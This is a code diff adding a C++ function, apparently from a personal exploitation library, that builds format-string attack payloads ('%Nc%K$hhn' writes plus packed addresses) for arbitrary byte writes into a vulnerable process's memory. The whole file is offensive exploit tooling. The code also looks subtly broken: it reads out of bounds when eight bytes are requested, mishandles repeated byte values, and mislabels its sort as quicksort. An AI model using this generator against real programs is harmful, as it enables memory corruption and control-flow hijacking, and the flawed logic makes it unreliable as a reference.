@@ -1,0 +1,34 @@
+bool compare(int a,int b){
+    return a<b;
+}
+
+
+std::string pwn::arbitrary_byte_write(long addr,long value,int nbytes,int base){
+    int offset=12*nbytes/8;
+    if(12*nbytes%8 !=0) offset+=1;
+    offset+=base;
+    uint8_t bytes[8]={0};
+    for(int i=0;i<nbytes;i++) bytes[i]=(value%(long)(pow(256,i+1)))/pow(256,i);
+    //quicksort
+    uint8_t bytes_tmp[8]={0};
+    for(int i=0;i<nbytes;i++) bytes_tmp[i]=bytes[i];
+    std::sort(bytes_tmp,bytes_tmp+8,compare);
+    std::string payload0;
+    std::string payload1;
+    int payload1_offset=0;
+    for(int i=8-nbytes;i<8;i++){
+        int j=0;
+        for(;j<nbytes;j++) if(bytes_tmp[i]==bytes[j]) break;
+        payload0.append("%");
+        payload0.append(std::to_string(bytes_tmp[i]-bytes_tmp[i-1]));
+        payload0.append("c%");
+        payload0.append(std::to_string(offset+payload1_offset));
+        payload1_offset++;
+        payload0.append("$hhn");
+        payload1 +=pwn::p64(addr+j);
+    }
+    int len=payload0.length();
+    for(int i=0;i<(offset-base)*8-len;i++) payload0.append("A");
+    payload0.append(payload1);
+    return payload0;
+}
